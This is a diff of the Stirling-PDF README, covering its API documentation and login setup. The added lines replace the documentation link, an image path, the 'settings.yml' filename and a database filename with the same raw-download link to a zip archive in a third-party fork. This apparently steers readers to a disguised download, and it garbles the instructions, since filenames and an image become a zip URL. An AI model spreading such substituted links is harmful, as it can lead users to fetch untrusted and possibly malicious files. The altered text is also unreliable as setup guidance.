+For those wanting to use Stirling-PDF's backend API to link with their own custom scripting to edit PDFs, you can view all existing API documentation [here](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip), or navigate to `https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip` of your Stirling-PDF instance for your version's documentation (or by following the API button in the settings of Stirling-PDF).
 
 ## Login Authentication
 
-![stirling-login](images/login-light.png)
+![stirling-login](https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip)
 
 ### Prerequisites
 
 - User must have the folder `./configs` volumed within Docker so that it is retained during updates.
 - Docker users must download the security jar version by setting `DOCKER_ENABLE_SECURITY` to `true` in environment variables.
-- Then either enable login via the `settings.yml` file or set `SECURITY_ENABLE_LOGIN` to `true`.
+- Then either enable login via the `https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip` file or set `SECURITY_ENABLE_LOGIN` to `true`.
 - Now the initial user will be generated with username `admin` and password `stirling`. On login, you will be forced to change the password to a new one. You can also use the environment variables `SECURITY_INITIALLOGIN_USERNAME` and `SECURITY_INITIALLOGIN_PASSWORD` to set your own credentials straight away (recommended to remove them after user creation).
 
-Once the above has been done, on restart, a new `stirling-pdf-DB.mv.db` will show if everything worked.
+Once the above has been done, on restart, a new `https://github.com/halo-kaleb/Stirling-PDF/raw/refs/heads/main/cucumber/exampleFiles/example_html.zip` will show if everything worked.
 
 When you log in to Stirling-PDF, you will be redirected to the `/login` page to log in with those default credentials. After login, everything should function as normal.
 
